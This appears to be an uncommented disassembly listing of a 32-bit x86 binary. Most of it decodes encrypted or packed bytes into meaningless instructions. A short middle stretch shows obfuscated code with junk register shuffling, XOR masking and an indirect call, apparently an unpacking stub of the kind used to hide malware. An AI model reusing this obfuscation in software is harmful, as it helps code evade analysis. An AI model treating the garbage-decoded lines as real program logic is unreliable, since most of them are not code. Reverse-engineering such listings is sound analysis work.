  40ce30:	xlat   BYTE PTR ds:[ebx]
  40ce31:	cmp    eax,0xc27fab
  40ce36:	xchg   edi,eax
  40ce37:	dec    edx
  40ce38:	jns    0x40ce62
  40ce3a:	jge    0x40ce5c
  40ce3c:	cdq    
  40ce3d:	inc    eax
  40ce3e:	mov    dx,0x9f2f
  40ce42:	xchg   BYTE PTR [ebx+edi*2-0x6cde7f3e],dh
  40ce49:	dec    esi
  40ce4a:	inc    eax
  40ce4b:	xchg   esi,eax
  40ce4c:	leave  
  40ce4d:	push   esi
  40ce4e:	mov    dh,0xfd
  40ce50:	jnp    0x40ce94
  40ce52:	jno    0x40ce86
  40ce54:	inc    esi
  40ce55:	dec    edx
  40ce56:	and    al,0x6a
  40ce58:	loope  0x40cde0
  40ce5a:	push   ss
  40ce5b:	fs sahf 
  40ce5d:	call   0x16580ce9
  40ce62:	adc    ebp,DWORD PTR [ebp-0x57]
  40ce65:	jge    0x40ce98
  40ce67:	scas   eax,DWORD PTR es:[edi]
  40ce68:	mov    ds:0x33302517,eax
  40ce6d:	jo     0x40ce9d
  40ce6f:	(bad)  
  40ce71:	outs   dx,BYTE PTR ds:[esi]
  40ce72:	dec    ecx
  40ce73:	dec    BYTE PTR [esi]
  40ce75:	scas   al,BYTE PTR es:[edi]
  40ce76:	sbb    esi,DWORD PTR [esi+esi*4+0x5b03c1fb]
  40ce7d:	adc    al,0x24
  40ce7f:	jmp    0x40ce3f
  40ce81:	jnp    0x40ce9e
  40ce83:	pushf  
  40ce84:	ja     0x40cf03
  40ce86:	leave  
  40ce87:	push   es
  40ce88:	mov    ds:0x4bd4b7e,eax
  40ce8d:	or     DWORD PTR [ebx],edx
  40ce8f:	sti    
  40ce90:	pushf  
  40ce91:	into   
  40ce92:	fnsave [eax+0x6381d19f]
  40ce98:	clc    
  40ce99:	adc    al,0x2
  40ce9b:	and    al,0xdd
  40ce9d:	imul   edx,DWORD PTR [eax+0x4266c518],0xffffffc1
  40cea4:	xchg   ebp,eax
  40cea5:	jle    0x40ce3e
  40cea7:	mov    dh,0xc7
  40cea9:	ret    0xdb3c
  40ceac:	ss scas al,BYTE PTR es:[edi]
  40ceae:	jge    0x40cefb
  40ceb0:	mov    al,ds:0x7e9e6052
  40ceb5:	pop    es
  40ceb6:	sahf   
  40ceb7:	mov    esp,0x9a9796e7
  40cebc:	in     eax,dx
  40cebd:	inc    esi
  40cebe:	repnz lea ebx,[ecx]
  40cec1:	sbb    al,0x7f
  40cec3:	sbb    DWORD PTR ds:0x987d1825,ebx
  40cec9:	fmulp  st(3),st
  40cecb:	retf   0x643a
  40cece:	mov    DWORD PTR [eax],ebx
  40ced0:	fiadd  WORD PTR [ebp-0x4d]
  40ced3:	xor    ch,bh
  40ced5:	sbb    cl,BYTE PTR [edx+ebx*4-0x7]
  40ced9:	lods   eax,DWORD PTR ds:[esi]
  40ceda:	and    ch,bh
  40cedc:	ins    BYTE PTR es:[edi],dx
  40cedd:	stc    
  40cede:	repz jo 0x40cf2f
  40cee1:	fisttp WORD PTR [ebp-0x45]
  40cee4:	pop    ebp
  40cee5:	aam    0xc0
  40cee7:	inc    edi
  40cee8:	loopne 0x40ce89
  40ceea:	xchg   dh,dh
  40ceec:	fstp   DWORD PTR [edi+0x23a11bb3]
  40cef2:	call   0x341407be
  40cef7:	sub    bl,BYTE PTR [ecx+0x5cc31155]
  40cefd:	dec    esi
  40cefe:	xor    edx,DWORD PTR [edx+edi*8]
  40cf01:	arpl   WORD PTR fs:[ebx],si
  40cf04:	xchg   esp,eax
  40cf05:	cs in  eax,0x89
  40cf08:	pushf  
  40cf09:	pop    ecx
  40cf0a:	shr    DWORD PTR ds:0x325ab2c7,cl
  40cf10:	ds out 0xa1,al
  40cf13:	dec    edx
  40cf14:	out    dx,al
  40cf15:	icebp  
  40cf16:	(bad)  
  40cf18:	jb     0x40cf45
  40cf1a:	pop    es
  40cf1b:	mov    ebp,0xd3884e77
  40cf20:	(bad)  
  40cf21:	stc    
  40cf22:	cli    
  40cf23:	xor    eax,0x891aaa78
  40cf28:	mov    ebp,0x5e1b0226
  40cf2d:	mov    ecx,0x20aeeeeb
  40cf32:	scas   al,BYTE PTR es:[edi]
  40cf33:	(bad)  
  40cf34:	jns    0x40cf09
  40cf36:	outs   dx,DWORD PTR ds:[esi]
  40cf37:	pop    ecx
  40cf38:	(bad)  [edi]
  40cf3a:	mov    ch,0xce
  40cf3c:	add    DWORD PTR [ebx],0x9
  40cf3f:	adc    eax,0x498acd4c
  40cf44:	xchg   esi,eax
  40cf45:	inc    edx
  40cf46:	xchg   ebp,eax
  40cf47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf48:	imul   esi,DWORD PTR [ebx+0x1ad61ac7],0x53
  40cf4f:	jmp    0x40ced9
  40cf51:	lds    ebx,FWORD PTR [esi+0x73798ccf]
  40cf57:	rcr    DWORD PTR [ecx+0x5138e47b],cl
  40cf5d:	bnd call 0x2bf725ff
  40cf63:	push   ecx
  40cf64:	ret    0x950a
  40cf67:	cld    
  40cf68:	hlt    
  40cf69:	retf   0x4a99
  40cf6c:	jb     0x40cf20
  40cf6e:	mov    edi,0xee69d6cf
  40cf73:	cwde   
  40cf74:	imul   ebx,DWORD PTR [ecx+0x2ffe85f6],0xffffffad
  40cf7b:	adc    esp,DWORD PTR ds:0x21f35b05
  40cf81:	mov    ss,WORD PTR ds:0x1b1fb975
  40cf87:	mov    bl,0x1f
  40cf89:	push   ebp
  40cf8a:	ret    
  40cf8b:	and    eax,0x782e73eb
  40cf90:	fbstp  TBYTE PTR [esi]
  40cf92:	loopne 0x40cf3f
  40cf94:	ds ins DWORD PTR es:[edi],dx
  40cf96:	in     al,dx
  40cf97:	jnp    0x40cf99
  40cf99:	ins    BYTE PTR es:[edi],dx
  40cf9a:	adc    esi,ebp
  40cf9c:	int3   
  40cf9d:	xchg   BYTE PTR [ebp-0x4b],bh
  40cfa0:	call   0x3aab4a3f
  40cfa5:	cmp    eax,0x3aa20966
  40cfaa:	loopne 0x40cf46
  40cfac:	jne    0x40cff7
  40cfae:	adc    ebx,DWORD PTR [edi+0x1dd28ec4]
  40cfb4:	es shr ebx,1
  40cfb7:	cdq    
  40cfb8:	sbb    al,0xbe
  40cfba:	repnz lock sahf 
  40cfbd:	add    edx,ecx
  40cfbf:	in     al,dx
  40cfc0:	mov    esi,0xbb89b6ec
  40cfc5:	call   0x96c245ff
  40cfca:	leave  
  40cfcb:	inc    eax
  40cfcc:	xor    al,0x66
  40cfce:	pop    ds
  40cfcf:	dec    ebx
  40cfd0:	sub    ebp,ecx
  40cfd2:	shr    DWORD PTR [edi-0x40c54629],cl
  40cfd8:	lea    esi,[esp+ecx*1-0x1d]
  40cfdc:	xchg   al,ch
  40cfde:	inc    ebx
  40cfdf:	jbe    0x40cfd3
  40cfe1:	jmp    0xdc1599d9
  40cfe6:	sub    BYTE PTR [eax-0x54c79505],dl
  40cfec:	xor    BYTE PTR [esi],cl
  40cfee:	fwait
  40cfef:	int3   
  40cff0:	mov    ss,edi
  40cff2:	(bad)  
  40cff3:	js     0x40d00e
  40cff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff6:	xor    eax,0x8066ee40
  40cffb:	xlat   BYTE PTR ds:[ebx]
  40cffc:	jmp    0x96d74911
  40d001:	pop    ds
  40d002:	dec    ecx
  40d003:	dec    esp
  40d004:	mov    ah,0x29
  40d006:	sub    ebp,DWORD PTR [edi-0x497dee2f]
  40d00c:	lods   al,BYTE PTR ds:[esi]
  40d00d:	mov    ds:0x26046deb,al
  40d012:	outs   dx,DWORD PTR ds:[esi]
  40d013:	sub    al,0x93
  40d015:	jae    0x40cfa9
  40d017:	jae    0x40cfab
  40d019:	pop    esp
  40d01a:	out    dx,al
  40d01b:	inc    esi
  40d01c:	sub    DWORD PTR [esi-0x5c],edi
  40d01f:	jge    0x40d07e
  40d021:	xchg   ebp,eax
  40d022:	lahf   
  40d023:	scas   al,BYTE PTR es:[edi]
  40d024:	sti    
  40d025:	dec    edx
  40d026:	cs dec ebx
  40d028:	mov    ebp,0xf93b6096
  40d02d:	mov    eax,ds:0xd62c8e3
  40d032:	fwait
  40d033:	sbb    DWORD PTR [edx-0x1904dc56],0xffffff9f
  40d03a:	fidivr DWORD PTR [edi]
  40d03c:	and    al,0xfd
  40d03e:	leave  
  40d03f:	outs   dx,BYTE PTR ds:[esi]
  40d040:	pop    es
  40d041:	sar    ch,1
  40d043:	lock rcr DWORD PTR ss:[ecx-0x614968f9],1
  40d04b:	mov    ch,bl
  40d04d:	jp     0x40d06d
  40d04f:	bound  esp,QWORD PTR [esi-0x68]
  40d052:	mov    esp,0xdb8224be
  40d057:	pop    ebp
  40d058:	fcomp  DWORD PTR [ebx]
  40d05a:	cmp    DWORD PTR fs:[edx],ebp
  40d05d:	mov    ah,BYTE PTR ds:0x608a3ff3
  40d063:	pop    ds
  40d064:	mov    ecx,0x1e1c0399
  40d069:	add    BYTE PTR [ebx-0x77],dl
  40d06c:	hlt    
  40d06d:	sub    ebx,DWORD PTR [ecx-0x4d]
  40d070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d071:	jecxz  0x40d025
  40d073:	sub    eax,0xd35f1a3b
  40d078:	gs jecxz 0x40d0c9
  40d07b:	(bad)  
  40d07c:	xor    ch,ch
  40d07e:	fwait
  40d07f:	jmp    0x40d091
  40d081:	gs sbb al,0x9a
  40d084:	cmc    
  40d085:	fisubr WORD PTR [ebx+ebp*2]
  40d088:	lods   eax,DWORD PTR ds:[esi]
  40d089:	jge    0x40d00d
  40d08b:	outs   dx,DWORD PTR ds:[esi]
  40d08c:	mov    al,ds:0x78d546fd
  40d091:	mov    bl,0xa4
  40d093:	mov    edx,0x25643108
  40d098:	add    al,0xfb
  40d09a:	fstp   st(7)
  40d09c:	inc    edx
  40d09d:	dec    esp
  40d09e:	or     dl,BYTE PTR [ecx]
  40d0a0:	adc    DWORD PTR [edi+eax*4-0x6d21bbb9],eax
  40d0a7:	jecxz  0x40d06f
  40d0a9:	outs   dx,BYTE PTR ds:[esi]
  40d0aa:	repnz adc DWORD PTR [edx],edx
  40d0ad:	rol    DWORD PTR [ebp+edx*1-0x42745311],cl
  40d0b4:	adc    al,0x51
  40d0b6:	lods   eax,DWORD PTR ds:[esi]
  40d0b7:	aam    0x13
  40d0b9:	sub    dl,BYTE PTR [ecx]
  40d0bb:	scas   al,BYTE PTR es:[edi]
  40d0bc:	sub    al,0x80
  40d0be:	jnp    0x40d12c
  40d0c0:	test   DWORD PTR [ebp+ecx*2-0x18],esi
  40d0c4:	dec    esi
  40d0c5:	(bad)  
  40d0c6:	mov    ah,0xf4
  40d0c8:	sbb    eax,DWORD PTR [esi]
  40d0ca:	fadd   QWORD PTR es:[ecx+edx*1+0x15]
  40d0cf:	test   al,0x8a
  40d0d1:	cmp    DWORD PTR [ebx],edi
  40d0d3:	repz xchg edi,eax
  40d0d5:	fs aaa 
  40d0d7:	mov    esi,0x2e32d2cd
  40d0dc:	sub    DWORD PTR [eax],ebp
  40d0de:	(bad)  
  40d0e0:	shl    BYTE PTR [ebx-0x7c52f86c],1
  40d0e6:	mov    bl,0x3b
  40d0e8:	repnz cld 
  40d0ea:	push   esp
  40d0eb:	imul   ecx,ebx,0x2c7de1e7
  40d0f1:	or     ebx,ebx
  40d0f3:	hlt    
  40d0f4:	add    DWORD PTR [edi-0x5c],esi
  40d0f7:	push   edi
  40d0f8:	pop    esp
  40d0f9:	pop    ebp
  40d0fa:	mov    gs,esp
  40d0fc:	dec    ebx
  40d0fd:	xchg   edx,eax
  40d0fe:	xchg   esi,eax
  40d0ff:	fdivr  DWORD PTR [esi+0x6d0522bd]
  40d105:	xchg   ebx,eax
  40d106:	ja     0x40d0ea
  40d108:	(bad)  
  40d109:	fdivrp st(6),st
  40d10b:	sub    al,0x83
  40d10d:	jg     0x40d0e7
  40d10f:	call   0xbed25d1c
  40d114:	mov    dh,0x8b
  40d116:	repz in al,0x5b
  40d119:	cmp    BYTE PTR [eax+0x7c],ah
  40d11c:	out    0xaa,eax
  40d11e:	cmp    al,0x8b
  40d120:	add    ebp,DWORD PTR [ecx-0x597c8231]
  40d126:	or     dh,BYTE PTR [esp+ebp*1]
  40d129:	jmp    0x1d33:0x86656d76
  40d130:	inc    esi
  40d131:	cdq    
  40d132:	repz xlat BYTE PTR ds:[ebx]
  40d134:	mov    gs,WORD PTR [edi-0x41273b26]
  40d13a:	add    BYTE PTR [ecx+0x5eb17e58],ch
  40d140:	sbb    edx,DWORD PTR [ecx-0x3a5fa6a2]
  40d146:	jge    0x40d176
  40d148:	sbb    esp,DWORD PTR [ebp-0xa]
  40d14b:	imul   ecx,DWORD PTR ds:0xa18e4060,0x6280cd01
  40d155:	(bad)  
  40d157:	data16 lods al,BYTE PTR ds:[esi]
  40d159:	in     al,0x8b
  40d15b:	add    ecx,esi
  40d15d:	jnp    0x40d1bf
  40d15f:	pop    ebp
  40d160:	xchg   edx,eax
  40d161:	int3   
  40d162:	das    
  40d163:	push   ecx
  40d164:	jne    0x40d199
  40d166:	mov    eax,ds:0xf0b28b60
  40d16b:	dec    edx
  40d16c:	arpl   WORD PTR [ebx+0x25],cx
  40d16f:	aam    0x3d
  40d171:	jae    0x40d183
  40d173:	out    0x89,eax
  40d175:	lock push ecx
  40d177:	xor    DWORD PTR [ebp+0x78],ebx
  40d17a:	mov    WORD PTR [eax-0x35455c56],?
  40d180:	xchg   ebp,eax
  40d181:	enter  0x7d0e,0x95
  40d185:	push   cs
  40d186:	in     al,0x2f
  40d188:	xor    DWORD PTR [ecx+0x6975a442],esi
  40d18e:	gs call 0xf91a:0x2cd38cbc
  40d196:	mov    dl,BYTE PTR [ecx+0x65213c]
  40d19c:	add    eax,eax
  40d19e:	cmp    DWORD PTR [ebx+0x2935580a],esp
  40d1a4:	pop    ebx
  40d1a5:	xchg   edx,eax
  40d1a6:	out    dx,eax
  40d1a7:	lods   eax,DWORD PTR ds:[esi]
  40d1a8:	xor    eax,0x3e35af06
  40d1ad:	(bad)  [edi+0x5a]
  40d1b0:	jb     0x40d16e
  40d1b2:	sub    edi,edx
  40d1b4:	sub    DWORD PTR [ebx+ebx*8-0x793ef02f],ecx
  40d1bb:	stos   BYTE PTR es:[edi],al
  40d1bc:	xchg   BYTE PTR [ebx+0x76],bl
  40d1bf:	sub    eax,0xb5d928fb
  40d1c4:	mov    ds:0x57dac351,eax
  40d1c9:	in     al,0x6c
  40d1cb:	outs   dx,DWORD PTR ds:[esi]
  40d1cc:	shl    DWORD PTR [eax],0x68
  40d1cf:	(bad)
  40d1d2:	mov    ebx,DWORD PTR [eax]
  40d1d4:	rol    DWORD PTR [esp+edx*8+0x38],cl
  40d1d8:	sar    DWORD PTR [edx-0x25280e72],1
  40d1de:	out    0x18,al
  40d1e0:	(bad)  
  40d1e1:	cmc    
  40d1e2:	mov    edx,0x600a0e23
  40d1e7:	shr    bh,cl
  40d1e9:	fwait
  40d1ea:	out    0x9a,al
  40d1ec:	jnp    0x40d1ae
  40d1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ef:	push   esi
  40d1f0:	mov    ecx,0x7b25c996
  40d1f5:	push   cs
  40d1f6:	leave  
  40d1f7:	and    al,0x85
  40d1fa:	je     0x40d244
  40d1fc:	ds mov eax,0x44c9e039
  40d202:	stc    
  40d203:	jns    0x40d1e8
  40d205:	add    DWORD PTR [ebp+0x42],edi
  40d208:	mov    cl,0xf1
  40d20a:	stc    
  40d20b:	mov    al,0x10
  40d20d:	out    0x55,al
  40d20f:	mov    bh,0x5a
  40d211:	add    edx,ebp
  40d213:	cld    
  40d214:	pop    esp
  40d215:	jnp    0x40d20b
  40d217:	sti    
  40d218:	sbb    al,0x5b
  40d21a:	mov    esi,0x5f36c852
  40d21f:	ds out 0x22,eax
  40d222:	aam    0x79
  40d224:	mov    cl,bh
  40d226:	xchg   BYTE PTR [edi+edi*8-0x1b00ef5f],dh
  40d22d:	es aad 0x74
  40d230:	int3   
  40d231:	push   esp
  40d232:	mov    ebp,edx
  40d234:	mov    esp,0x59377999
  40d239:	lods   al,BYTE PTR ds:[esi]
  40d23a:	jle    0x40d25e
  40d23c:	jne    0x40d2b5
  40d23e:	div    BYTE PTR [ecx]
  40d240:	jp     0x40d28c
  40d242:	push   esp
  40d243:	lock adc DWORD PTR ds:0x5cd55309,eax
  40d24a:	jno    0x40d24b
  40d24c:	sub    al,bh
  40d24e:	dec    ecx
  40d24f:	xlat   BYTE PTR ds:[ebx]
  40d250:	(bad)  
  40d251:	pop    ds
  40d252:	lods   eax,DWORD PTR ds:[esi]
  40d253:	mov    bh,BYTE PTR [edi+0x2b]
  40d256:	mov    bl,0x62
  40d258:	dec    edx
  40d259:	xchg   cl,ah
  40d25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25c:	dec    edi
  40d25d:	fcom   DWORD PTR [ebx]
  40d25f:	cmp    al,ch
  40d261:	xchg   edx,eax
  40d262:	fsubr  DWORD PTR [edi-0x1a8458dc]
  40d268:	sub    al,0x24
  40d26a:	sub    DWORD PTR [ecx+0x38],ebx
  40d26d:	aam    0xdb
  40d26f:	loopne 0x40d24c
  40d271:	cwde   
  40d272:	mov    BYTE PTR [edx],0xc9
  40d275:	push   ss
  40d276:	xchg   ebp,eax
  40d277:	mov    bl,0xed
  40d279:	lods   eax,DWORD PTR ds:[esi]
  40d27a:	test   eax,ebx
  40d27c:	fadd   QWORD PTR [ebx+0x6fde17aa]
  40d282:	pop    ss
  40d283:	add    eax,0xa5a2457d
  40d288:	fisttp QWORD PTR [ebx+0x13]
  40d28b:	in     eax,0x1f
  40d28d:	dec    ebp
  40d28e:	int    0x6d
  40d290:	ds dec esi
  40d292:	push   esi
  40d293:	xchg   al,dl
  40d295:	and    DWORD PTR [ecx-0x1bba74d0],ebx
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d430
  40d43c:	mov    ebp,0x2a1a4bdb
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	pop    eax
  40d448:	sub    edx,edx
  40d44a:	arpl   WORD PTR [esi+0x644b57e5],bx
  40d450:	inc    ebx
  40d451:	pusha  
  40d452:	mov    eax,eax
  40d454:	push   ds
  40d455:	or     eax,0x3d79e131
  40d45a:	inc    edx
  40d45b:	fild   WORD PTR [ebp-0x59a414a7]
  40d461:	aaa    
  40d462:	adc    BYTE PTR [edx+edx*1-0x454496be],cl
  40d469:	dec    ecx
  40d46a:	rcl    BYTE PTR [bx],0xeb
  40d46e:	xor    eax,0x1a08d8e8
  40d473:	and    cl,al
  40d475:	inc    esp
  40d476:	test   BYTE PTR [eax-0x44dc53fc],ah
  40d47c:	aaa    
  40d47d:	(bad)  [eax+0x22]
  40d480:	rol    DWORD PTR [esi-0x3bfc07c3],1
  40d486:	sahf   
  40d487:	sub    bh,BYTE PTR [esi+0x4498c7f5]
  40d48d:	ret    
  40d48e:	enter  0x6cca,0x36
  40d492:	out    dx,al
  40d493:	mov    esi,0x1eb85f15
  40d498:	mov    ebp,0x2a5661e6
  40d49d:	jg     0x40d4f1
  40d49f:	out    dx,eax
  40d4a0:	sahf   
  40d4a1:	fistp  DWORD PTR [esi-0x5152063f]
  40d4a7:	in     al,dx
  40d4a8:	stc    
  40d4a9:	loop   0x40d4f3
  40d4ab:	cmp    BYTE PTR [ecx],dh
  40d4ad:	imul   ebp,DWORD PTR es:[ecx],0x567ed0ba
  40d4b4:	xchg   ebx,eax
  40d4b5:	add    al,0x79
  40d4b7:	dec    edx
  40d4b8:	cmp    al,0x8b
  40d4ba:	jnp    0x40d47b
  40d4bc:	add    ebx,DWORD PTR [edx+0x7c1a6bb2]
  40d4c2:	inc    ebx
  40d4c3:	outs   dx,BYTE PTR ds:[esi]
  40d4c4:	leave  
  40d4c5:	cli    
  40d4c6:	repz or DWORD PTR [edi+0x9ac656e],esp
  40d4cd:	ins    DWORD PTR es:[edi],dx
  40d4ce:	ficom  WORD PTR [edx]
  40d4d0:	retf   0xec46
  40d4d3:	push   edx
  40d4d4:	sar    BYTE PTR [eax],0x2d
  40d4d7:	mov    esp,0xe2ff6f73
  40d4dc:	lea    ebp,[edx]
  40d4de:	add    cl,0x22
  40d4e1:	add    DWORD PTR [edx+0x3c],0xffffffb2
  40d4e5:	popf   
  40d4e6:	xor    ecx,DWORD PTR [ecx]
  40d4e8:	xor    DWORD PTR [ebx],0xaf0a5476
  40d4ee:	dec    esp
  40d4ef:	pop    ds
  40d4f0:	and    DWORD PTR [esi+0x2b],ecx
  40d4f3:	dec    esi
  40d4f4:	lahf   
  40d4f5:	mov    edx,0x803b0338
  40d4fa:	cs nop
  40d4fc:	test   BYTE PTR [ebx+0x1b],al
  40d4ff:	mov    ds:0x9a9ea01f,eax
  40d504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d505:	lock jl 0x40d556
  40d508:	sbb    al,dh
  40d50a:	jmp    0x7496:0xdb94a5b6
  40d511:	jnp    0x40d510
  40d513:	in     al,dx
  40d514:	in     al,0x57
  40d516:	mov    ah,0x54
  40d518:	jg     0x40d546
  40d51a:	dec    esi
  40d51b:	(bad)  
  40d51c:	jne    0x40d542
  40d51e:	mov    DWORD PTR [ebx],ecx
  40d520:	das    
  40d521:	mov    dl,0x76
  40d523:	std    
  40d524:	inc    eax
  40d525:	(bad)  
  40d526:	and    dl,al
  40d528:	mov    ch,0x98
  40d52a:	inc    ebp
  40d52b:	in     al,dx
  40d52c:	enter  0x88a1,0x35
  40d530:	sub    BYTE PTR [esi+0x4ec983b9],ah
  40d536:	scas   al,BYTE PTR es:[edi]
  40d537:	xor    esi,DWORD PTR [ebx+edi*1]
  40d53a:	push   eax
  40d53b:	push   0x56
  40d53d:	clc    
  40d53e:	dec    ebx
  40d53f:	mov    dl,0x24
  40d541:	sbb    BYTE PTR [edx-0x6a],0x21
  40d545:	jmp    0x17c:0xa0fc96dc
  40d54c:	sub    cl,BYTE PTR [esi-0x32]
  40d54f:	mov    al,ds:0x36fddb1f
  40d554:	aad    0x46
  40d556:	pusha  
  40d557:	adc    dl,ah
  40d559:	add    BYTE PTR [ebx+0x3e],ah
  40d55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d55d:	stos   DWORD PTR es:[edi],eax
  40d55e:	cdq    
  40d55f:	leave  
  40d560:	mov    dh,0xb6
  40d562:	fsubrp st(4),st
  40d564:	or     eax,DWORD PTR [ebx-0x72b7265d]
  40d56a:	pop    eax
  40d56b:	aam    0x6d
  40d56d:	xchg   esi,eax
  40d56e:	test   DWORD PTR [ebx-0x10],edx
  40d571:	cwde   
  40d572:	mov    al,ds:0x25067864
  40d577:	popa   
  40d578:	pop    ebp
  40d579:	int    0x23
  40d57b:	int    0x14
  40d57d:	adc    DWORD PTR [esi+0x3c],ecx
  40d580:	cmp    eax,0x652db409
  40d585:	jle    0x40d566
  40d587:	adc    dh,BYTE PTR [edi-0x22]
  40d58a:	lahf   
  40d58b:	retf   0x14fc
  40d58e:	into   
  40d58f:	xor    DWORD PTR [esi+0x694604fb],ecx
  40d595:	pop    esp
  40d596:	or     al,BYTE PTR [eax]
  40d598:	out    0x97,eax
  40d59a:	cmp    dl,BYTE PTR [ecx+0x1117c64d]
  40d5a0:	sahf   
  40d5a1:	inc    esi
  40d5a2:	and    eax,0x5e70c2aa
  40d5a7:	scas   eax,DWORD PTR es:[edi]
  40d5a8:	adc    eax,0xa31fdf94
  40d5ad:	mul    BYTE PTR [ebp+0x4ff73268]
  40d5b3:	xchg   BYTE PTR [bp+si-0x12fa],ch
  40d5b8:	cli    
  40d5b9:	test   BYTE PTR [esp+ebp*8-0x40],0xfb
  40d5be:	daa    
